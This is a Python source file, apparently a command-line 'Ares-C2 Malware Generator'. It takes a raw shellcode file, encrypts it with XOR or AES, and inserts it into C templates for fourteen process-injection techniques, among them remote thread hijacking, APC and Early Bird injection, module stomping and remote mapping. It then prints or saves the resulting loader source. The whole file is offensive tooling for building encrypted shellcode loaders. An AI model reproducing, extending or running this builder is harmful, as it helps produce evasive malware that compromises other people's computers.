import sys
import hashlib
from os import urandom
from Cryptodome.Cipher import AES


BANNER = r"""
    ________________________
    `'-.,________,,..-  ___ \________
       > `'-.,_____,,.-`<_>\ )__     `\
         >            `'-._    _)____  \
          >          _.-'`  _______  `\ |
           >   _,,..--'''```       `'-.\|
Ares-C2    >-'``                        `'
Malware Generator
"""


# ===================== Utilities =====================

def read_file(path):
    try:
        with open(path, "rb") as f:
            return f.read()
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)


def format_bytes(data):
    return '0x' + ', 0x'.join(f'{b:02x}' for b in data)


# ===================== Crypto =====================

def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)


def aes_encrypt(data, key):
    k = hashlib.sha256(key).digest()
    iv = b'\x00' * 16
    cipher = AES.new(k, AES.MODE_CBC, iv)
    return cipher.encrypt(pad(data))


def xor_encrypt(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])


# ===================== Selection Logic =====================

def choose_payload_section():
    options = {
        1: "Data",
        2: "Rdata",
        3: "Text"
    }

    print("""
Choose The Payload Placement :
  1 - .Data
  2 - .Rdata
  3 - .Text
""")

    choice = int(input("Enter Number: "))
    return options.get(choice, "Text")


def choose_encryption(section):
    print("""
Choose the Encryption Type :
  1 - XOR
  2 - AES
""")

    choice = int(input("Enter Number: "))

    key = urandom(16)
    plaintext = read_file(sys.argv[1])

    if choice == 1:
        template = f"Template/Decryption/Xor{section}.c"
        decrypt_line = "Xor(Shellcode, sizeof(Shellcode), Key, sizeof(Key));"
        ciphertext = xor_encrypt(plaintext, key)
    else:
        template = f"Template/Decryption/AES{section}.c"
        decrypt_line = "AESDecrypt((char *) Shellcode, sizeof(Shellcode), Key, sizeof(Key));"
        ciphertext = aes_encrypt(plaintext, key)

    return template, decrypt_line, key, ciphertext


def choose_injection():
    print("""
Choose the Process Injection Techniques :
  1  - Local Process Injection
  2  - Remote Process Injection
  3  - Local Thread Hijacking (Creation)
  4  - Local Thread Hijacking (Enumeration)
  5  - Remote Thread Hijacking (Creation)
  6  - Remote Thread Hijacking (Enumeration)
  7  - APC Injection [Alertable]
  8  - APC Injection [Suspended]
  9  - Early Bird APC
  10 - EnumChildWindows Callback
  11 - Local Mapping
  12 - Remote Mapping
  13 - Local Stomping
  14 - Remote Stomping
""")

    mapping = {
        1: "ClassicProcess.c",
        2: "RemoteProcess.c",
        3: "ThreadHijnackLocal.c",
        4: "ThreadHijnackLocalEnum.c",
        5: "ThreadHijnackRemote.c",
        6: "ThreadHijnackRemoteEnum.c",
        7: "APCInj1.c",
        8: "APCInj2.c",
        9: "EarlyBird.c",
        10: "CallBackFun.c",
        11: "LocalMapping.c",
        12: "RemoteMapping.c",
        13: "LocalStomping.c",
        14: "RemoteStomping.c",
    }

    choice = int(input("Enter Number: "))
    template = f"Template/ProcessInjection/{mapping.get(choice)}"

    process_name = None
    if choice == 2:
        process_name = input("Enter Process Name: ") or "explorer.exe"

    return template, process_name


# ===================== Template Processing =====================

def build_encryption(template_path, key, ciphertext):
    with open(template_path, "r") as f:
        code = f.read()

    code = code.replace("// Replace this with Key", format_bytes(key))
    code = code.replace("// Replace this with encrypted Shellcode", format_bytes(ciphertext))

    return code


def build_injection(template_path, decrypt_line, process_name):
    with open(template_path, "r") as f:
        code = f.read()

    code = code.replace("// Replace this with Decryption", decrypt_line)

    if process_name:
        code = code.replace("//Replace This With Process Name", process_name)

    return code


# ===================== Main =====================

def main():
    print(BANNER)

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <raw payload file>")
        sys.exit(1)

    section = choose_payload_section()
    enc_template, decrypt_line, key, ciphertext = choose_encryption(section)
    inj_template, process_name = choose_injection()

    enc_code = build_encryption(enc_template, key, ciphertext)
    inj_code = build_injection(inj_template, decrypt_line, process_name)

    final_code = inj_code.replace("// Replace This with Shellcode", enc_code)

    print(final_code)

    save = input("\nSave the code [Y/N]? ").lower()
    if save in ("y", "yes"):
        filename = input("Enter filename: ")
        with open(filename, "w") as f:
            f.write(final_code)


if __name__ == "__main__":
    main()